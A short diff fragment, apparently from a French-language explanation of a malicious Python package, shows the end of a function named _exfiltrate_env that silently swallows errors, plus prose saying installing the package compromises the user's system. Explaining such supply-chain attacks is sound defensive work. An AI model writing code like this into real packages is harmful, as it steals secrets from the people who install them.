@@ -34,7 +34,7 @@ def _exfiltrate_env():
         s.close()
     except Exception:
         pass
-```
+
 
 Ainsi, un utilisateur qui installe et utilise ce paquet croit bénéficier d’une librairie pratique, mais son système est immédiatement compromis.
 
